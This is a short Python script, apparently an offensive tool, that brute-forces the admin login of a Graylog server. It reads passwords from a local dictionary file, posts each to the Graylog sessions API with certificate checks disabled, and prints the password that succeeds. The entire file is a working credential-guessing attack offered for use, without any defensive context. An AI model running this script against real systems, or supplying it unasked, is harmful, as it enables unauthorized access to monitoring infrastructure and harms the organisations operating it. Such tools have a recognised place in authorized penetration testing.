#!/usr/bin/env python3

# Graylog Login Bruteforce

#%%%%%%%%%%% Libraries %%%%%%%%%%%#

import json
import requests
import sys
import os
import colorama
from colorama import Fore, Style

#%%%%%%%%%%% Constants %%%%%%%%%%%#

separator = "[*] ============================================================================================================== [*]"

#%%%%%%%%%% Functions %%%%%%%%%#

def graylogbrute(graylogip):

    url = "http://"+graylogip+":9000/api/system/sessions"
    __location__ = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))
    file = open(os.path.join(__location__, 'dict.txt'))
    bruteforcesuccesfull = 0

    for line in file:
        graylogpassword = line.strip('\n\r')
        params = {'username':'admin','password':graylogpassword,'host':graylogip}
        headers = {'X-Requested-By': 'XMLHttpRequest'}

        try:
            response = requests.post(url,json=params,headers=headers,verify=False)

            if response.status_code == 200:
                print(separator)
                print("[!] Dictionary Attack Successful!")
                print(separator)
                print("[!] Username: "+Fore.RED+Style.BRIGHT+"admin")
                print(Style.RESET_ALL + "[!] Password: "+Fore.RED+Style.BRIGHT+graylogpassword)
                print(Style.RESET_ALL + separator)
                bruteforcesuccesfull = 1
                break

        except Exception as e:
            pass

    if not bruteforcesuccesfull:
        print(separator)
        print("[!] Dictionary Attack Not Successful")
        print(separator)

#%%%%%%%%%% The End %%%%%%%%%%#
